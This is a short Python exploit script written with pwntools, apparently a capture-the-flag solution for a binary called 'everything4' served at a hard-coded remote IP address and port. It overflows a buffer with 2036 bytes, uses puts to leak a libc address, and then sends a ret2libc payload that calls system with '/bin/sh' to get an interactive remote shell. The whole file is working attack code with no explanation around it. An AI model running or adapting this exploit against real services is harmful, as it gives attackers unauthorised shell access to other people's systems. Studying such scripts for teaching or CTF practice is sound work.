from pwn import *

elf = context.binary = ELF("./everything4")

host, port = "103.191.63.187", 5001
p = remote(host, port)

libc = elf.libc

p.recvline()
payload = flat(b"A" * 2036, elf.plt["puts"], elf.sym["main"], elf.got["puts"])
p.recvline()
p.sendline(payload)

puts_leak = u32(p.recv(4))

libc.address = puts_leak - libc.sym["puts"]
log.success(f"libc base: {hex(libc.address)}")

payload = flat(
    b"A" * 2036, libc.sym["system"], libc.sym["exit"], next(libc.search(b"/bin/sh"))
)

p.sendline(payload)

p.interactive()
